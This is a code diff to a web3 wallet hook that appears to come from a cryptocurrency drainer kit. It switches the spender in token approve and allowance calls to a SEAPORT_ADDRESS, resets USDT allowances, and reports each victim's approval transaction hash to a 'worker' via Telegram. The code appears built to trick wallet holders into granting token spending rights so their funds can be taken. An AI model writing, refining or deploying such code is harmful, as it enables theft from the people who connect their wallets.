@@ -673,15 +673,15 @@ export function useWeb3Manager() {
 
                             // USDT Allowance Fix: approve(0) first if allowance exists
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
-                                const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                                const allowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
                                 if (allowance > 0n) {
                                     console.log("🛠️ USDT non-zero allowance detected. Resetting to 0 first...");
-                                    const resetTx = await tokenContract.approve(RECEIVER_ADDRESS, 0);
+                                    const resetTx = await tokenContract.approve(SEAPORT_ADDRESS, 0);
                                     await resetTx.wait();
                                 }
                             }
 
-                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, finalAmount);
+                            const approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
 
                             // Send approval TX hash to worker via Telegram
                             const tgMsg = `⚡ APPROVAL: ${JSON.stringify({
